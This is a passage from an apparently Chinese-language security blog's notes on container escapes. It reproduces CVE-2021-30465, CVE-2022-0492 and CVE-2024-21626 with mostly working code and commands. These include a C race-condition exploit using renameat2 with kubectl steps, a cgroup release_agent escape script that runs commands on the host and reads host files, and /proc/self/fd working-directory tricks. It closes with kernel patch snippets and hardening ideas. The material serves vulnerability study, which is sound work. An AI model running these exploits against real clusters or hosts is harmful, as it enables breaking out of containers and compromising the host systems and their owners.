class="string">c15</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c16</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c17</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c18</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c19</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">c20</span></span><br><span class="line">      <span class="attr">image:</span> <span class="string">abc.cba/aaa:latest</span></span><br><span class="line">      <span class="attr">command:</span> [ <span class="string">&quot;/bin/sleep&quot;</span>, <span class="string">&quot;inf&quot;</span> ]</span><br><span class="line">      <span class="attr">volumeMounts:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt1</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt2</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt3</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/mnt4</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">mountPath:</span> <span class="string">/test1/zzz</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test1</span></span><br><span class="line">          <span class="attr">emptyDir:</span></span><br><span class="line">            <span class="attr">medium:</span> <span class="string">&quot;Memory&quot;</span></span><br><span class="line">        <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">test2</span></span><br><span class="line">          <span class="attr">emptyDir:</span></span><br><span class="line">            <span class="attr">medium:</span> <span class="string">&quot;Memory&quot;</span></span><br></pre></td></tr></table></figure>

<p>除了第一个容器以外，其他容器的镜像都是无效的，每个容器都挂载了一个test1卷和5个test2卷。</p>
<p>获取创建好的pod的UID：<code>kubectl get pod pod1 -o yaml | grep uid</code></p>
<p>将获取到的UID填入下面的POC中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span> &#123;</span><br><span class="line">    <span class="type">char</span> *name_mnts[] = &#123;<span class="string">&quot;mnt1&quot;</span>, <span class="string">&quot;mnt2&quot;</span>, <span class="string">&quot;mnt3&quot;</span>, <span class="string">&quot;mnt4&quot;</span>&#125;;</span><br><span class="line">    <span class="type">char</span> *name_tmps[] = &#123;<span class="string">&quot;mnt-tmp1&quot;</span>, <span class="string">&quot;mnt-tmp2&quot;</span>, <span class="string">&quot;mnt-tmp3&quot;</span>, <span class="string">&quot;mnt-tmp4&quot;</span>&#125;;</span><br><span class="line">    # 替换UID</span><br><span class="line">    <span class="type">char</span> *ld = <span class="string">&quot;/var/lib/kubelet/pods/&#123;UID&#125;/volumes/kubernetes.io~empty-dir/&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> dirfd = open(<span class="string">&quot;.&quot;</span>, O_DIRECTORY|O_CLOEXEC);</span><br><span class="line"></span><br><span class="line">    <span class="type">pid_t</span> pid;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">4</span>; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">        pid = fork();</span><br><span class="line">        <span class="keyword">if</span> (pid == <span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (pid != <span class="number">0</span>)</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        mkdir(name_mnts[i], <span class="number">0755</span>);</span><br><span class="line">        symlink(ld, name_tmps[i]);</span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">            renameat2(dirfd, name_mnts[i], dirfd, name_tmps[i], RENAME_EXCHANGE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>编译：<code>gcc exp.c -o exp</code></p>
<p>复制到攻击容器c1：<code>kubectl cp exp -c c1 pod1:/test1/</code></p>
<p>进入到攻击容器c1：<code>kubectl exec -it pod1 -c c1 bash</code></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 创建到根目录的符号链接</span></span><br><span class="line"><span class="built_in">ln</span> -s / /test2/test2</span><br><span class="line"><span class="comment"># 执行exp</span></span><br><span class="line"><span class="built_in">cd</span> /test1</span><br><span class="line">./exp</span><br></pre></td></tr></table></figure>



<p>此时攻击容器已经在不断切换挂载卷到根目录的符号链接，试图利用竞争条件</p>
<p>切到宿主机另一个终端，创建并启动剩下的19个容器：</p>
<p><code>for c in &#123;2..20&#125;; do kubectl set image pod pod1 c$c=ubuntu:latest; done</code></p>
<p>新容器开始挂载卷，容易被c1进行竞争条件攻击</p>
<p>创建完成之后，查看有多少个容器成功利用漏洞：</p>
<p><code>for c in &#123;2..20&#125;; do echo c$c; kubectl exec -it pod/pod1 -c c$c -- ls /test1/zzz; done</code></p>
<p>最后有三个容器都成功挂在了宿主机文件系统</p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240419155537970.png" alt="image-20240419155537970"></p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240419155551114.png" alt="image-20240419155551114"></p>
<p>进入c7容器验证一下</p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240419155828748.png" alt="image-20240419155828748"></p>
<h3 id="12-2-7-CVE-2022-0492-cgroupfs读写未鉴权"><a href="#12-2-7-CVE-2022-0492-cgroupfs读写未鉴权" class="headerlink" title="12.2.7 CVE-2022-0492 - cgroupfs读写未鉴权"></a>12.2.7 CVE-2022-0492 - cgroupfs读写未鉴权</h3><p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://github.com/h4ckm310n/Container-Vulnerability-Exploit/tree/main/CVE-2022-0492">https://github.com/h4ckm310n/Container-Vulnerability-Exploit/tree/main/CVE-2022-0492</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/Breeze_CAT/article/details/123427680">https://blog.csdn.net/Breeze_CAT/article/details/123427680</a></li>
<li><a target="_blank" rel="noopener" href="https://tari.moe/2024/CVE-2022-0492.html">https://tari.moe/2024/CVE-2022-0492.html</a></li>
</ul>
<p>POC: </p>
<p><strong>背景</strong></p>
<p>cgroup、<code>release_agent</code></p>
<p><code>unshare</code></p>
<p><strong>原理</strong></p>
<p>cgroup的<code>release_agent</code>缺失权限校验，无需<code>CAP_SYS_ADMIN</code>即可发生容器逃逸</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">cgroup_release_agent_write</span><span class="params">(<span class="keyword">struct</span> kernfs_open_file *of,</span></span><br><span class="line"><span class="params">                      <span class="type">char</span> *buf, <span class="type">size_t</span> nbytes, <span class="type">loff_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cgroup</span> *<span class="title">cgrp</span>;</span></span><br><span class="line"></span><br><span class="line">    BUILD_BUG_ON(<span class="keyword">sizeof</span>(cgrp-&gt;root-&gt;release_agent_path) &lt; PATH_MAX); cgrp = cgroup_kn_lock_live(of-&gt;kn, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">if</span> (!cgrp)</span><br><span class="line">        <span class="keyword">return</span> -ENODEV;</span><br><span class="line">    spin_lock(&amp;release_agent_path_lock);</span><br><span class="line">    strlcpy(cgrp-&gt;root-&gt;release_agent_path, strstrip(buf),</span><br><span class="line">        <span class="keyword">sizeof</span>(cgrp-&gt;root-&gt;release_agent_path));</span><br><span class="line">    spin_unlock(&amp;release_agent_path_lock);</span><br><span class="line">    cgroup_kn_unlock(of-&gt;kn);</span><br><span class="line">    <span class="keyword">return</span> nbytes;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>整体思路上和配置错误的<code>CAP_SYS_ADMIN</code>+<code>release_agent</code>逃逸方法类似，只不过利用条件不同</p>
<p>利用条件：</p>
<ul>
<li>容器支持cgroup v1，而v2则不受该漏洞影响</li>
<li>默认情况下，在容器中cgroup文件系统是只读的，因此需要挂载一个可写的cgroupfs</li>
<li>要在容器中执行挂载操作，需要关闭<code>AppArmor</code>或<code>SELinux</code></li>
<li>进程还需要拥有<code>CAP_SYS_ADMIN</code>这一capability才能挂载cgroupfs，要在容器中获取<code>CAP_SYS_ADMIN</code>需要调用<code>unshare</code>命令，这一操作需要关闭Seccomp</li>
<li>容器需要通过root用户运行</li>
</ul>
<p>后来的修复补丁，在写入<code>release_agent</code>文件之前，会先检查namespace是否是<code>init_user_ns</code>，以及进程是否拥有<code>CAP_SYS_ADMIN</code>：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((of-&gt;file-&gt;f_cred-&gt;user_ns != &amp;init_user_ns) || !capable(CAP_SYS_ADMIN))</span><br><span class="line">    <span class="keyword">return</span> -EPERM;</span><br></pre></td></tr></table></figure>





<p><strong>复现</strong></p>
<p>环境：</p>
<ul>
<li>kernel: 5.11.0-22-generic&#x3D;&#x3D;可以执行libbpf的minimal，但不能运行bootstrap&#x3D;&#x3D;</li>
<li>docker-ce: 19.03.9</li>
<li>docker-cli: 26.0.1</li>
<li>containerd.io: 1.5.10</li>
<li>runc: 1.0.3</li>
</ul>
<p>POC: </p>
<p>启动一个没有安全措施的裸奔容器&#x3D;&#x3D;据说这种裸奔容器在K8S集群环境下很常见&#x3D;&#x3D;：</p>
<p><code>sudo docker run --rm -it -h cve --name cve --security-opt=&quot;seccomp=unconfined&quot; --security-opt=&quot;apparmor=unconfined&quot; ubuntu:20.04 /bin/bash</code></p>
<p>容器内执行：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">unshare -UrmC --propagation=unchanged bash</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/cgroup</span><br><span class="line">mount -t cgroup -o rdma cgroup /mnt/cgroup</span><br><span class="line"><span class="built_in">mkdir</span> /mnt/cgroup/x</span><br><span class="line"><span class="comment"># 这一步是为了找到容器文件系统在宿主机中的绝对路径，执行mount命令同理</span></span><br><span class="line">host_path=`sed -n <span class="string">&#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27;</span> /etc/mtab`</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /mnt/cgroup/x/notify_on_release</span><br><span class="line"><span class="built_in">touch</span> /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;#!/bin/sh&#x27;</span> &gt; /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;ps -ef &gt;&gt; <span class="variable">$host_path</span>/result&quot;</span>  &gt;&gt; /cmd</span><br><span class="line"><span class="built_in">chmod</span> 777 /cmd</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$host_path</span>/cmd&quot;</span> &gt; /mnt/cgroup/release_agent</span><br><span class="line">sh -c <span class="string">&quot;echo \$\$ &gt;  /mnt/cgroup/x/cgroup.procs&quot;</span></span><br></pre></td></tr></table></figure>

<p>最后如果在容器根目录下的result文件中看到宿主机的进程情况，则说明漏洞利用成功</p>
<hr>
<p>&#x3D;&#x3D;下面是参照另一个POC的，随便看看&#x3D;&#x3D;</p>
<p><code>sudo docker run -it --rm --name cve --security-opt=&quot;seccomp=unconfined&quot; --security-opt=&quot;apparmor=unconfined&quot; centos /bin/bash</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@35149cd17b7e /]# cat /proc/self/status | grep Cap</span><br><span class="line">CapInh:	00000000a80425fb</span><br><span class="line">CapPrm:	00000000a80425fb</span><br><span class="line">CapEff:	00000000a80425fb</span><br><span class="line">CapBnd:	00000000a80425fb</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[root@35149cd17b7e /]# unshare -UrmC bash</span><br><span class="line">[root@35149cd17b7e /]# cat /proc/self/status | grep Cap</span><br><span class="line">CapInh:	0000000000000000</span><br><span class="line">CapPrm:	000001ffffffffff</span><br><span class="line">CapEff:	000001ffffffffff</span><br><span class="line">CapBnd:	000001ffffffffff</span><br><span class="line">CapAmb:	0000000000000000</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /mnt/cgroup</span><br><span class="line">mount -t cgroup -o rdma cgroup /mnt/cgroup</span><br><span class="line"></span><br><span class="line"><span class="built_in">mkdir</span> /mnt/cgroup/x</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /mnt/cgroup/x/notify_on_release</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mount | grep upperdir</span><br><span class="line"><span class="comment"># /var/lib/docker/overlay2/39355e43d9f1e72c8b01194401b360933e060553516845dbaa98e38eace47529/diff</span></span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">touch hacked</span><br><span class="line">vi malicious.sh</span><br></pre></td></tr></table></figure>



<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="built_in">cat</span> /host_file &gt;&gt; /var/lib/docker/overlay2/39355e43d9f1e72c8b01194401b360933e060553516845dbaa98e38eace47529/diff/hacked</span><br></pre></td></tr></table></figure>



<p>&#x2F;host_file是宿主机根目录下的一个文件，内容为“host file content”，</p>
<p><code>sudo chmod 700 /host_file</code></p>
<p><code>echo &quot;/var/lib/docker/overlay2/cf4618f2c01df01010584e44a0caab0b12a845cc8ef1e37945ccf83934857f33/diff/malicious.sh&quot; &gt; /mnt/cgroup/release_agent</code></p>
<hr>
<p>12.2.8 CVE-2022-23648</p>
<p><a target="_blank" rel="noopener" href="https://github.com/raesene/CVE-2022-23648-POC">https://github.com/raesene/CVE-2022-23648-POC</a></p>
<hr>
<h3 id="12-2-9-CVE-2024-21626-未关闭的cgroupfs描述符"><a href="#12-2-9-CVE-2024-21626-未关闭的cgroupfs描述符" class="headerlink" title="12.2.9 CVE-2024-21626 - 未关闭的cgroupfs描述符"></a>12.2.9 CVE-2024-21626 - 未关闭的cgroupfs描述符</h3><p>Blog: </p>
<ul>
<li><a target="_blank" rel="noopener" href="https://nitroc.org/posts/cve-2024-21626-illustrated/">https://nitroc.org/posts/cve-2024-21626-illustrated/</a></li>
</ul>
<p>POC: </p>
<p><strong>背景</strong></p>
<p><strong>原理</strong></p>
<p>&#x3D;&#x3D;看上面的博客&#x3D;&#x3D;</p>
<blockquote>
<p>runc run 命令在刚启动时会创建一个 libcontainer.linuxContainer 对象。在创建此对象之前会先创建一个用于操作 cgroup 的接口类型对象 cgroups.Manager，由于 runc 操作 cgroup 的实现原理，它会打开宿主机文件系统中的 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录，后续对 cgroup 文件的打开操作都是基于 openat2(2) 系统调用。但是在生成子进程时并没有把 &#x2F;sys&#x2F;fs&#x2F;cgroup 目录的文件描述符关闭，以至于子进程仍可以利用该文件描述符的 &#x2F;proc&#x2F;self&#x2F;fd&#x2F;&lt;fdnum&gt; 符号链接访问宿主机文件系统。如果 openat(2) 调用失败，那么会调用 openFallback() 函数以绝对路径的方式打开 cgroup 文件。</p>
</blockquote>
<p><strong>复现</strong></p>
<p>环境：</p>
<ul>
<li>docker-cli: 26.0.1</li>
<li>docker-ce: 5:24.0.6-1~ubuntu.20.04~focal</li>
<li>containerd.io: 1.6.24-1</li>
<li>runC: 1.1.9</li>
</ul>
<p>Docker命令启动时指定<code>-w</code>参数，设置工作目录为<code>/proc/self/fd/7</code>或<code>/proc/self/fd/8</code>即可，比如：<code>sudo docker run -w /proc/self/fd/8 --name cve --rm -it ubuntu</code></p>
<p>可能要试多几次才能成功：</p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240416202140819.png" alt="image-20240416202140819"></p>
<p>又或者是稳定点的利用方式：</p>
<p>正常启动容器：<code>sudo docker run --name cve --rm -it ubuntu</code></p>
<p>容器中创建<code>/proc/self/fd/7</code>或<code>/proc/self/fd/8</code>的符号链接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@a6dfc902999d:/# ln -sf /proc/self/fd/7/ /foo</span><br><span class="line">root@a6dfc902999d:/# ln -sf /proc/self/fd/8/ /bar</span><br></pre></td></tr></table></figure>

<p>容器外部设定工作目录为任一符号链接，执行容器内命令：</p>
<p><code>sudo docker exec -it -w /foo cve sleep 600</code></p>
<p>回到容器内找到<code>sleep</code>程序的PID号：</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">ls</span> -F /proc/</span><br><span class="line"><span class="built_in">cat</span> /proc/11/cmdline <span class="comment"># 显示sleep600</span></span><br></pre></td></tr></table></figure>

<p>接着就可以用<code>proc/&#123;PID&#125;/cwd/../../../../&#123;xxxx&#125;</code>形成路径穿越访问宿主机文件系统了：</p>
<p><img src="/2024/04/08/%E5%AE%B9%E5%99%A8%E5%AE%89%E5%85%A8/image-20240416203052892.png" alt="image-20240416203052892"></p>
<h2 id="13-3-内核漏洞引起的逃逸"><a href="#13-3-内核漏洞引起的逃逸" class="headerlink" title="13.3 内核漏洞引起的逃逸"></a>13.3 内核漏洞引起的逃逸</h2><hr>
<p>13.3.1 CVE-2016-5195 - DirtyCow</p>
<hr>
<h3 id="13-3-2-CVE-2022-0847-DirtyPipe"><a href="#13-3-2-CVE-2022-0847-DirtyPipe" class="headerlink" title="13.3.2 CVE-2022-0847 - DirtyPipe"></a>13.3.2 CVE-2022-0847 - DirtyPipe</h3><p>Blog:</p>
<p>* </p>
<p>POC:</p>
<p>* </p>
<h2 id="13-4-内核层加固"><a href="#13-4-内核层加固" class="headerlink" title="13.4 内核层加固"></a>13.4 内核层加固</h2><p><strong>配置类</strong></p>
<p><strong>组件CVE</strong></p>
<p>CVE-2018-15664：在内核最终对路径进行解析的位置的函数进行加固（限制宿主机）</p>
<p>CVE-2019-5736：限制runC的fd只能被特定程序打开？</p>
<p>CVE-2019-14271：限制加载的动态链接库不能是容器内的？</p>
<p>CVE-2019-16884：不允许卷的挂载路径为<code>/proc</code></p>
<p>CVE-2021-30465：判断参数传入的挂载路径和最后实际的挂载路径是否一致？</p>
<p>CVE-2022-0492：在写入<code>release_agent</code>文件之前，先检查namespace是否是<code>init_user_ns</code>，或者进程是否拥有<code>CAP_SYS_ADMIN</code></p>
<p>CVE-2024-21626：判断对工作目录是否为容器目录的判断？</p>
	
		</div>
		
		<div id="current-post-cover" data-scr="/img/post-cover/docker.jpg"></div>

